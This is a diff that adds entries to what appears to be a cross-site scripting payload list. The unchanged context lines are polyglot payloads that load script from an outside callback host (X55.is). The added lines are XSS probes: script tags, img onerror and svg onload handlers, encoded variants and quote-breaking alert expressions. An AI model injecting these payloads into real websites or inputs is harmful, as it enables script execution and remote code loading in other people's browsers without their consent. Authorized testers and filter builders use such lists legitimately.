@@ -33,3 +33,14 @@ JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Scri
 '/*\'/*"/*\"/*</Script><Input/AutoFocus/OnFocus=/**/(import(/https:\\X55.is?1=18369/.source))//>
 <Script /Src=https://X55.is?1=18369></Script>
 "><svg><a xlink:href="https://X55.is?1=18369/.source">click</a></svg>
+<script>alert("XSS")</script>
+"><img src=x onerror=alert(document.domain)>
+Hii"></a></i><svg onload=alert(document.domain)
+flg="><img src=x onerror=prompt(document.domain)>
+%253Csvg onload=alert(1)%253E
+alert('XSS Found');
+-onclick=alert('xss') 
+*onclick=alert('xss')
+'-alert(1)-'
+'*alert(1)*'
+</h1></h1><script>alert("XSS")</script>
